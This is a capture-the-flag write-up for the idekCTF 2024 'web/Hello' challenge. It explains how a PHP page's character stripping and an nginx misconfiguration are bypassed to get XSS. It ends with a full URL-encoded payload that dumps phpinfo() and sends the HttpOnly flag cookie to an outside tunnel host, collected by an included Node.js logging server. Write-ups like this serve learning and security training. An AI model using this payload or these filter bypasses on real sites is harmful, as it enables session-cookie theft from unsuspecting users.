---
title: "idekCTF 2024: web/Hello"
date: 2024-08-19
author: Rylie
categories: ["ctf"]
tags: ["web", "idekctf"]
---

> Just to warm you up for the next Fight :"D

Challenge files: <!-- todo -->

For [idekCTF 2024](https://ctf.idek.team/), I'm back on the web train again. This time... Unbelievably stuck at a simple XSS challenge. Well, let's dive right into it!

## The challenge

You are given a web page, which responds to any parameters with the key `name` with `Hello, <name>`. For example:

```http
GET /?name=yes HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: idek-hello.chal.idek.team:1337
User-Agent: HTTPie

HTTP/1.1 200 OK
Connection: close
Content-Type: text/html; charset=UTF-8
Date: Sat, 17 Aug 2024 05:48:12 GMT
Server: nginx/1.27.1
Transfer-Encoding: chunked

Hello, yes
```

Along with it, we have an admin bot. Inspecting the source code from the challenge files, we can see that it spawns a Puppeteer instance, connects to `CHALLENGE_ORIGIN`, setting a `HttpOnly` cookie with the value `FLAG=idek{PLACEHOLDER}`, and then connects to an arbitrary `TARGET_URL` that we can specify.

Our goal is now to *somehow* pull out the cookie to obtain the flag.

## The website

Before we take a look at the source code for the admin bot, I will start with snooping around the webpage itself. The setup is very simple - an `nginx` web server, serving `index.php`:

```php
<?php


function Enhanced_Trim($inp) {
    $trimmed = array("\r", "\n", "\t", "/", " ");
    return str_replace($trimmed, "", $inp);
}


if(isset($_GET['name']))
{
    $name=substr($_GET['name'],0,23);
    echo "Hello, ".Enhanced_Trim($_GET['name']);
}

?>
```

Here, it tries to truncate the string to 24 characters... but forgets to actually pass in the truncated value into `Enhanced_Trim()`. So, the raw value of the parameter `name` is then passed into `Enhanced_Trim()`, which removes all instances of `\r`, `\n`, `\t`, `/`, and spaces.

What this means so far is, we can attempt to insert some magical HTML into here, but `<script>` tags won't work, since you can't close them, as `/` is trimmed away. We can try using `<img onerror="">`, as it doesn't require a closing tag. Once again, spaces are trimmed, so it will result in the HTML `<imgonerror="">`. This isn't what we want.

Luckily, we can insert `U+000C FORM FEED (FF)` as a replacement for spaces, as these are *somehow* valid HTML separators. A little test with `?name=<img%0Conerror%3D"alert("hi")"%0Csrc="">`, and we got ourselves a nice alert popping up on our browser window!

Now then... What's next?

## Randomly fetching things

With the `onerror` attribute now up and rolling, it's time I try fetching something, but clearly that wouldn't be easy. For any non-relative links, you need the *entire* URL, as in `http://some.domain/`. "But, we can't use the `/` in the parameter!", I hear you say. Well, somehow, someway, the *backwards* slash (`\`) counts as a valid separator in this case, so we can do `http:\\some.domain\` and it will fetch properly. Now that we have a method to fetch from the HTML injection, let's just try leaking the cookie naively. Once again, note that the cookie is set as `HttpOnly`, but it doesn't hurt to get a try right?

Using [`cloudflared`](https://github.com/cloudflare/cloudflared), I booted up a quick tunnel to expose a Node.js server to the Internet. I will *attempt* to log any response headers to see what comes up.

```js
const http = require('http');

const server = http.createServer((req, res) => {
  console.log('request headers:', req.headers);

  res.statusCode = 200;
  res.setHeader('Content-Type', 'text/plain');
  res.end('hi');
});

const PORT = 3000;
server.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}/`);
});
```

## todo
- snoop source code
- query `?name=<string>`, plan is to get xss somehow.
    - this is not sanitized, injecting `<script>` works?
        - `Enhanced_Trim($inp)` trims away `/`, can't close `<script>` tag.
    - tracking pixel? `<img onload="">`?
        - `Enhanced_Trim($inp)` trims away spaces, can't write the `onload` attribute.
        - using 0x0C as a replacement for spaces works.
        - sanity check: `<img%0Conerror%3D"alert("hi")"%0Csrc="">` works as we expected.
        - can't do `fetch("http://some.domain")` because forward slashes are trimmed out.
        - seems like the method is to fetch stuff *in* the server?
        - forward a request from our `TARGET_URL` back to the server, including credentials using `{ credentials: "include" }` as an attempt to leak cookies
            - doesn't work, don't even bother, `HttpOnly` too strong.
        - `info.php` prints the result of `phpinfo()`, would it leak the cookie from the request?
            - fetching from the site using `?name=` throws a 403
            - fetching it from the target url *also* throws a 403?
            - inserting `Host` and `Origin` headers doesn't work.
        - vulnerability in nginx config:
            ```
            location ~ \.php$ {
            root           /usr/share/nginx/html;
            fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
            include fastcgi_params;
            fastcgi_pass unix:/var/run/php/php8.2-fpm.sock;
            }
            ```
            - can access `info.php` by using `info.php/index.php` as route.
        - now to somehow leak it using the puppeteer instance.
        - `\` is a valid separator -> this works for the the fetches
        - access from the given url because of cors: `?name=%3Cimg%0Conerror%3D%27fetch(%22info.php\\index.php%22%2C%20%7B%20credentials%3A%20%22include%22%7D)%27%0Csrc=%22%22%3E`
        - wait but the flag is set **AFTER** you go to the site.
        - the browser gets set to `null` after you're done -> you don't have a second chance
        - flow looks like:
            - go to site
            - flag gets set
            - **somehow** fetch `info.php` to leak flag
            - send back to our server
        - this means `TARGET_URL` has to be the challenge instance *again* to view leaked flag?
        - final script:`http://idek-hello.chal.idek.team:1337/?name=%3Cimg%0Conerror%3D%22fetch%28%27info.php%5C%5Cindex.php%27%2C%7Bcredentials%3A%27include%27%7D%29.then%28response%3D%3Eresponse.text%28%29%29.then%28data%3D%3E%7Bdocument.body.innerHTML%3Ddata%3Bfetch%28%27https%3A%5C%5C%5C%5Cbar-fleet-nm-super.trycloudflare.com%5C%5C%27%2BArray.from%28document.getElementsByClassName%28%27e%27%29%29.filter%28item%3D%3Eitem.innerText%3D%3D%3D%27%24_COOKIE%5B%5C%27FLAG%5C%27%5D%27%29%5B0%5D.parentElement.children%5B1%5D.innerText%29%7D%29.catch%28e%3D%3Edocument.body.innerHTML%3De%29%3B%22%0Csrc=%22%22%3E`
        - methodology:
            - bypass nginx config to access `info.php`
            - dump `info.php` to current document
            - fetch flag from the html
            - send a request back to a server
